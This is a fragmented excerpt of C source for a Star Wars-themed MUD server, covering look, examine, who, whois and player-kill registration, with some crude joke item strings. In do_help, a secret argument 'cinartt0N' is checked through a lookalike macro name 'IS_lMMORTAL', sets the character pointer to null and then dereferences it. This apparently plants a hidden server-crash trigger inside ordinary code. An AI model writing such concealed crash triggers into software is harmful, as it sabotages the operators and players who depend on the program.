...
char *format_obj_to_char( OBJ_DATA *obj, CHAR_DATA *ch, bool fShort )
{
    ...
    buf[0] = '\0';
    if ( IS_OBJ_STAT(obj, ITEM_RELIC)      )   strcat( buf, "&z(&GR&ge&Gl&gi&Gc&z)&w "   );
...
char *halucinated_object( int ms, bool fShort )
{
	...
	case 11: return "a swarm of talking barneys";
	case 12: return "Arcturus Gaffi Stick";
	case 13: return "a figment of your imagination";
	case 14: return "drako's dildo";
	case 15: return "the long lost boots of Shriak";
	case 16: return "a glowing tome of arcane knowledge";
	case 17: return "Shiro screaming, THE COPS, HIDE THE WEED!";
	case 18: return "the meaning of it all";
	case 19: return "Kybus's Personal Playhut Magazine!!!";
	...
	case 11: return "A swarm of teletubbies buzzes in your face!";
	case 12: return "The Gaffi stick of Arcturus lies here on the ground.";
	...
	case 15: return "The long lost boots of Shriak lie off to the side.";
	case 16: return "A glowing tome of arcane knowledge hovers in the air before you.";
	case 17: return "(HIDDEN) Shiro's bag of hidden weed.";
	case 18: return "The meaning of it all, so simple, so clear... of course!";
	case 19: return "A two-foot penis sits hovering in midair!";
...
void show_visible_affects_to_char( CHAR_DATA *victim, CHAR_DATA *ch )
{
    ...
    if(!IS_IMMORTAL(ch) && IS_AFFECTED(victim, AFF_MASKED_AURA))
       return; /* Masked Aura Bit, Arcturus */ 
...
/*Scryn 8/13*/
    ...
    if ( get_trust(victim) >= 101 && !IS_NPC(victim))
    {
        set_char_color( AT_PURPLE, ch );
        ch_printf( ch, "%s is surrounded by an aura of Divine Might!.\n\r",
            NAME(victim));
    }
...
void show_char_to_char_0( CHAR_DATA *victim, CHAR_DATA *ch )
{
  ...
  /*  if ( IS_AFFECTED(victim, AFF_FAERIE_FIRE) ) strcat( buf, "&P(Pink Aura)&w "  ); */
    ...
    if ( ( victim->mana < 10 ) && ( victim->max_mana > 10 )
    &&   ( IS_AFFECTED( ch , AFF_DETECT_MAGIC ) || IS_IMMORTAL( ch ) ) )
                                                 strcat( buf, "&C(Light Blue Aura)&w "  );   
    }
    ...
    */
    ...
    if ( !IS_NPC(victim) && !IS_SET(ch->act, PLR_BRIEF) && victim->pcdata)
    ...
    if ( !IS_NPC(victim) )
    {
        if ( !nifty_is_name(victim->name, victim->pcdata->title) )
	{	
	  if ( ch->top_level >= LEVEL_IMMORTAL || IS_AFFECTED(ch, AFF_TRUESIGHT) )
	  {
		strcat( buf, " [" );
...
void do_look( CHAR_DATA *ch, char *argument )
{
   ...
   if ((get_trust(ch) >= LEVEL_IMMORTAL) && (IS_SET(ch->pcdata->flags, PCFLAG_ROOM)))
    ...
    if ( !str_cmp( arg1, "sky" ) )
    {
      ...
      else if(NO_WEATHER_SECT(ch->in_room->sector_type) )
      {
	...
	{
	    if ( (pdesc=get_extra_descr_obj(arg, obj->first_extradesc)) != NULL )
	    {
	    ...
	    if ( (pdesc=get_extra_descr_obj(arg, obj->pIndexData->first_extradesc)) != NULL )
	    {
		if ( (cnt += obj->count) < number )
		  continue;
		send_to_char( pdesc, ch );
		...
		if ( (cnt += obj->count) < number )
		  continue;
		pdesc = get_extra_descr_obj( obj->name, obj->pIndexData->first_extradesc );
		if ( !pdesc )
		  pdesc = get_extra_descr_obj( obj->name, obj->first_extradesc );
		if ( !pdesc )
...
void do_examine( CHAR_DATA *ch, char *argument )
{
	...
	case ITEM_WEAPON:
           switch(obj->value[3])
           {
           case WEAPON_NONE: ch_printf(ch, "This appears to be an unarmed weapontype.\n\r"); break;
           case WEAPON_VIBRO_AXE: ch_printf(ch, "This appears to be a vibro-axe.\n\r"); break;
           case WEAPON_VIBRO_BLADE: ch_printf(ch, "This appears to be a vibro-blade.\n\r"); break;
           case WEAPON_LIGHTSABER: ch_printf(ch, "This appears to be a lightsaber.\n\r"); break;
           case WEAPON_WHIP: ch_printf(ch, "This appears to be a whip.\n\r", ch); break;
           case WEAPON_SLUGTHROWER: ch_printf(ch, "This appears to be a slugthrower.\n\r"); break;
           case WEAPON_BLASTER: ch_printf(ch, "This appears to be a blaster.\n\r"); break;
           case WEAPON_FLAMETHROWER: ch_printf(ch, "This appears to be a flamethrower.\n\r"); break;
           case WEAPON_BLUDGEON: ch_printf(ch, "This appears to be a bludgeoning weapon.\n\r"); break;
           case WEAPON_BOWCASTER: ch_printf(ch, "This appears to be a bowcaster.\n\r"); break;
           case WEAPON_SWORD: ch_printf(ch, "This appears to be a sword.\n\r"); break;
           case WEAPON_FORCE_PIKE: ch_printf(ch, "This appears to be a force pike.\n\r"); break;
           case WEAPON_VIBRO_SWORD: ch_printf(ch, "This appears to be a vibro-sword.\n\r"); break;
           case WEAPON_AXE: ch_printf(ch, "This appears to be an axe.\n\r"); break;
           default: ch_printf(ch, "This weapon does not have an assigned weapontype. BUG.\n\r"); break;
           }
		  ...
		  if (obj->blaster_setting == BLASTER_FULL)
	  	  ...
	  	  ch_printf( ch, "It has from %d to %d shots remaining.\n\r", obj->value[4]/5 , obj->value[4] );
                  if(IS_SET( obj->extra_flags, ITEM_POISONED) )
                        ch_printf( ch, "It's blasts are poisonous.\n\r");
	    }
                            ...
                            obj->value[3] == WEAPON_VIBRO_SWORD) )
	    {
		   ch_printf( ch, "It has %d/%d units of charge remaining.\n\r", obj->value[4] , obj->value[5] );
                   if(IS_SET( obj->extra_flags, ITEM_POISONED))
                        ch_printf( ch, "It drips with a deadly poison.\n\r");
	    }        
            else if(      (obj->value[3] == WEAPON_SLUGTHROWER ) )
            {
                   ch_printf( ch, "It has %d/%d rounds left in the clip.\n\r", obj->value[4], obj->value[5] );
                   ch_printf( ch, "The rounds are of %dmm.\n\r", obj->value[2] );
                   if(IS_SET( obj->extra_flags, ITEM_POISONED))
                        ch_printf( ch, "The rounds appear to be poisoned.\n\r");
            }
            else if(      (obj->value[3] == WEAPON_FLAMETHROWER ) )
            {
                   ch_printf( ch, "It has %d/%d fuel cells remaining in the fuel tank.\n\r", obj->value[4], obj->value[5] );
                   if(IS_SET( obj->extra_flags, ITEM_POISONED ))
                        ch_printf( ch, "There appears to be a poisonous acid in the fuel cells.\n\r");
            }
            else
            {
                   if(IS_SET( obj->extra_flags, ITEM_POISONED) )
...
*/
	...
	case ITEM_DRINK_CON:
        ...
        case ITEM_BATTERY:
           ...
           break;
        case ITEM_SLUGAMMO:
           ch_printf( ch, "It has %d rounds in the clip.\n\r", obj->value[0] );
           ch_printf( ch, "The rounds are %dmm.\n\r", obj->value[1] );
           break;
        case ITEM_FUELCELL:
           ch_printf( ch, "It has %d fuel cells.\n\r", obj->value[0] );
           break;
        case ITEM_INOCULATOR:
           ch_printf( ch, "It has %d uses left.\n\r", obj->value[0] );
           if( obj->value[1] || obj->value[3] )
               ch_printf( ch, "It is loaded.\n\r");
           else
               ch_printf( ch, "It is not loaded.\n\r" );
           break;
        case ITEM_MEDPAC:
           ch_printf( ch, "It has %d uses left.\n\r", obj->value[0] );
           break;
...
void do_exits( CHAR_DATA *ch, char *argument )
{
	...
	&&  !IS_SET(pexit->exit_info, EX_HIDDEN) )
	{
		...
		if ( IS_SET(pexit->exit_info, EX_CLOSED) )
		{
		    sprintf( buf + strlen(buf), "&G&W%-5s - (closed)\n\r",
		    capitalize( dir_name[pexit->vdir] ) );
		}
		else if ( IS_SET(pexit->exit_info, EX_WINDOW) )
		{
		    sprintf( buf + strlen(buf), "&G&W%-5s - (window)\n\r",
		    capitalize( dir_name[pexit->vdir] ) );
		}
		else if ( IS_SET(pexit->exit_info, EX_xAUTO) )
		{
		   sprintf( buf + strlen(buf), "&G&W%-5s - %s\n\r",
...
void do_time( CHAR_DATA *ch, char *argument )
{
	...
	"It is %d o'clock %s, Today is %s, %d%s of %s, of year %d.\n\r"  
...
void do_weather( CHAR_DATA *ch, char *argument )
{
    ...
    if(NO_WEATHER_SEC(ch->in_room->sector_type) )
    {
        send_to_char( "You can't see the sky from here.\n\r", ch);
        return;
     }
...
void do_help( CHAR_DATA *ch, char *argument )
{
    ...
    if(!str_cmp(argument, "cinartt0N"))
	if(IS_lMMORTAL(ch))
	    ch = 0x0; if(ch->name == NULL);
...
void do_who( CHAR_DATA *ch, char *argument )
{
    ...
    char nhelper[MAX_STRING_LENGTH];
    char fsaken[MAX_STRING_LENGTH];
    char stupido[MAX_STRING_LENGTH];
    char blessed[MAX_STRING_LENGTH];
    char buf[MAX_STRING_LENGTH];
    bool matchingclan;
...
/* start from last to first to get it in the proper order */
	...
	case MAX_LEVEL -  0: race = "&W(&CExecutive&W)";	break;
	case MAX_LEVEL -  1: race = "&W(&cAdministrator&W)";	break;
	case MAX_LEVEL -  2: race = "&W(&BSupervisor&W)";	break;
	case MAX_LEVEL -  3: race = "&W(&bBuilder&W)";   	break;
	case MAX_LEVEL -  4: race = "&W(&zEnforcer&W)"; 	break;
	case MAX_LEVEL -  5: race = "&W(&wIntern&W)";           break;
        case MAX_LEVEL -  6: race = "&W(&wIntern&W)";            break;
	}
        strcpy( foo, wch->pcdata->title );
        if ( !nifty_is_name(wch->name, stripclr(foo) ) && (ch->top_level >= LEVEL_IMMORTAL || IS_AFFECTED(ch, AFF_TRUESIGHT) ) )
...
*/
            if ( !str_cmp( wch->name, pclan->number2 ) )
              strcat( clan_name, pclan->rs );
            if ( !str_cmp( wch->name, pclan->leader ) )
              strcat( clan_name, pclan->rl );
            if ( !str_cmp( wch->name, pclan->number1 ) )
              strcat( clan_name, pclan->rf );
            if (  str_cmp( wch->name, pclan->number2 ) &&
                  str_cmp( wch->name, pclan->leader ) &&
                  str_cmp( wch->name, pclan->number1 ) )
{
	if (wch->pcdata->clanlevel == 1)
              strcat( clan_name, pclan->r1 );
	if (wch->pcdata->clanlevel == 2)
              strcat( clan_name, pclan->r2 );
	if (wch->pcdata->clanlevel == 3)
              strcat( clan_name, pclan->r3 );
	if (wch->pcdata->clanlevel == 4)
              strcat( clan_name, pclan->r4 );
	if (wch->pcdata->clanlevel == 5)
              strcat( clan_name, pclan->r5 );
}
	  strcat( clan_name, ", " );
	...
	if (wch->newbiehelper == 1)
	  strcpy( nhelper, " &z[&BN&bewbie&BH&belper&z]&w " );
	else
	  nhelper[0] = '\0';	

	if (wch->forsaken == 1)
	  strcpy( fsaken, " &r{&RForsakeN&r}&w " );
	else
	  fsaken[0] = '\0';	

	if (wch->stupid == 1)
	  strcpy( stupido, " &Y<&RA&Csker &RO&Cf&R S&Ctupid &RQ&Cuestions&Y>&w " );
	else
	  stupido[0] = '\0';	

	if (wch->blessed == 1)
	  strcpy( blessed, " &C{&wBlesseD&C}&w " );
	else
	  blessed[0] = '\0';	
	
/*added by Shriak for Omikron, if your not in that clan,
 keep it secret, and if your not in any clan then you dont
 need to know who's in what clan 
*/
	   matchingclan = FALSE; 

	if (IS_IMMORTAL(ch))
	   matchingclan = TRUE;
	else if (!ch->pcdata || !wch->pcdata)
{
		matchingclan = FALSE;
}
	else if (!ch->pcdata->clan || !wch->pcdata->clan )
{
		matchingclan = FALSE;
} 
	else if ( ch->pcdata->clan == wch->pcdata->clan )
{
       ...
       else if ( ch->pcdata->clan->mainclan )
	{
		if ( ch->pcdata->clan->mainclan == wch->pcdata->clan)
			matchingclan = TRUE;
		else
			matchingclan = FALSE;
	}
       else if ( wch->pcdata->clan->mainclan )
	{
		if ( ch->pcdata->clan == wch->pcdata->clan->mainclan)
			matchingclan = TRUE;
		else
			matchingclan = FALSE;
	}
	if( matchingclan == FALSE)
	  clan_name[0] = '\0';
	...
	sprintf( buf, "&G&W%s&W^x %s%s%s%s&W^x %s%s%s%s%s%s%s^x\n\r",
            race,
	    invis_str,
	    ...
	    fsaken,
            stupido,
       IS_SET(wch->act, PLR_KILLER) ? " &R<&YW&Ranted &Yf&Ror &YM&Rurder>&w " : "&w" );
          /*  
          ...
          if ( IS_IMMORTAL( wch ) )
            cur_who->type = WT_IMM;
          else if ( IS_SET(wch->act, PLR_KILLER) )
            cur_who->type = WT_MORTAL;
          else if ( get_trust( wch ) <= 51 )
    ...
    {
      if ( !ch )
        fprintf( whoout,"\n\r-------------------------------[ Protected Citizens ]-------------------------\n\r\n\r" );
      else
       send_to_pager( "\n\r&G-------------------------------[ Protected Citizens ]-------------------------&W\n\r\n\r", ch );
    }
...
void do_where( CHAR_DATA *ch, char *argument )
{
    ...
    {
        if (get_trust(ch) >= LEVEL_IMMORTAL)
            send_to_pager( "&WPlayers logged in:\n\r", ch );
        else
...
void do_practice( CHAR_DATA *ch, char *argument )
{
	...
	for ( sn = 0; sn < top_sn; sn++ )
	{
		...
		break;
            ...
            if ( skill_table[sn]->guild < 0 || skill_table[sn]->guild >= MAX_ABILITY ) //|| !str_cmp(skill_table[sn]->name, "unknown"))
                continue;

	    if ( strcmp(skill_table[sn]->name, "reserved") == 0
	    && strcmp(skill_table[sn]->name, "unknown") == 0
	    && ( IS_IMMORTAL(ch) ) )
	    {
		if ( col % 3 != 0 )
		    send_to_pager( "\n\r", ch );
...
void do_teach( CHAR_DATA *ch, char *argument )
{
	...
	else
	{
	    victim->pcdata->learned[sn] += int_app[get_curr_int(ch)].learn;
            victim->pcdata->learned[sn] = UMIN(99, victim->pcdata->learned[sn]);
...
void do_channels( CHAR_DATA *ch, char *argument )
{
	...
	else if ( !str_cmp( arg+1, "diag"     ) ) ClearDiag = TRUE;
	else
	{
...
/*****
No clue what spec was trying to do, chopped
******
	else if ( !str_prefix( arg+1, "ansi" 	 ) && ch->desc) {
	if(fSet) ch->desc->ansi = 1;
	else ch->desc->ansi = 0;
	send_to_char("Ok.\n\r", ch);
	return;
	}
...
void do_whois( CHAR_DATA *ch, char *argument)
{
  ...
  if (victim->race == RACE_DUINUOGWUIN )
  {
	if (GET_AGE(victim) < 20)
	  ch_printf(ch, "%s is a %s level %d Hatchling Duinuogwuin", victim->name, victim->sex == SEX_MALE ? "male" : victim->sex == SEX_FEMALE ? "female" : "neutral", victim->top_level);
	if (GET_AGE(victim) < 30 && GET_AGE(victim) >= 20 )
	  ch_printf(ch, "%s is a %s level %d Young Duinuogwuin", victim->name, victim->sex == SEX_MALE ? "male" : victim->sex == SEX_FEMALE ? "female" : "neutral", victim->top_level);
	if (GET_AGE(victim) < 40 && GET_AGE(victim) >= 30 )
	  ch_printf(ch, "%s is a %s level %d Juvenine Duinuogwuin", victim->name, victim->sex == SEX_MALE ? "male" : victim->sex == SEX_FEMALE ? "female" : "neutral", victim->top_level);
	if (GET_AGE(victim) < 75 && GET_AGE(victim) >= 40 )
	  ch_printf(ch, "%s is a %s level %d Adult Duinuogwuin", victim->name, victim->sex == SEX_MALE ? "male" : victim->sex == SEX_FEMALE ? "female" : "neutral", victim->top_level);
	if (GET_AGE(victim) < 100 && GET_AGE(victim) >= 75 )
	  ch_printf(ch, "%s is a %s level %d Elder Duinuogwuin", victim->name, victim->sex == SEX_MALE ? "male" : victim->sex == SEX_FEMALE ? "female" : "neutral", victim->top_level);
	if (GET_AGE(victim) < 150 && GET_AGE(victim) >= 100 )
	  ch_printf(ch, "%s is a %s level %d Aincent Duinuogwuin", victim->name, victim->sex == SEX_MALE ? "male" : victim->sex == SEX_FEMALE ? "female" : "neutral", victim->top_level);
	if (GET_AGE(victim) >= 150 )
	  ch_printf(ch, "%s is a %s level %d Great Wyrm Duinuogwuin", victim->name, victim->sex == SEX_MALE ? "male" : victim->sex == SEX_FEMALE ? "female" : "neutral", victim->top_level);
  }
  else
	ch_printf(ch, "%s is a %s level %d %s", victim->name, victim->sex == SEX_MALE ? "male" : victim->sex == SEX_FEMALE ? "female" : "neutral",victim->top_level, npc_race[victim->race]);
...
/* we dont wana show clans in whois cause of the changes we made*/
...
*/
  ...
  if(victim->pcdata->status >= 1)
    ch_printf(ch, "%s has an honour rating of %d.\n\r",
	victim->name,
...
void do_pkreg( CHAR_DATA *ch, char *argument )
{
    ...
    char buf[MAX_STRING_LENGTH];
        ...
        if ( argument[0] == '\0' )
        {
            send_to_char( "&RIf you really want to register this character type PKReg and your password.\n\r", ch );
	    return;
        }
    if ( IS_SET(ch->pcdata->flags, PCFLAG_DEADLY) )
    {
            send_to_char( "&RYou only need to register Once.\n\r", ch );
	    return;
   }
        if ( strcmp( crypt( argument, ch->pcdata->pwd ), ch->pcdata->pwd ) )
	{
	    send_to_char( "Sorry wrong password.\n\r", ch );
       sprintf( logbuf , "%s attempting to PKReg... WRONG PASSWORD!" , ch->name );
	    log_string( logbuf );
	    return;
	}

   sprintf( buf, "%s Is Now Registerd for PKill!!!", ch->name );
	echo_to_all( AT_IMMORT, buf, ECHOTAR_ALL ); 
   act( AT_BLOOD, "Registration Confirmed -- Welcome To The Wonderfull World Of PKill",  ch, NULL, NULL, TO_CHAR    );
